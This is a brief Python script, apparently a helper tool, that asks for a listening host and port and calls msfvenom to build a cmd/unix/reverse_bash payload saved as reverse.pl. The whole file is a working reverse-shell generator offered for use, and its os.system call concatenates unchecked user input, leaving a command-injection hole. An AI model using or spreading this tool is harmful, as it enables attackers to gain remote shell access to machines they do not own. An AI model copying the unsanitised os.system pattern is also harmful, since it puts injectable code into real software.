import os
import sys
import subprocess

def clear():
    subprocess.call("clear")

class create:
    clear()
    f = input("add lhost =>")
    print(f)
    c = input("add lport =>")
    print(c)
    os.system("msfvenom -p cmd/unix/reverse_bash LHOST=" + f + " " + "LPORT=" + c + " " + "-f raw > reverse.pl")
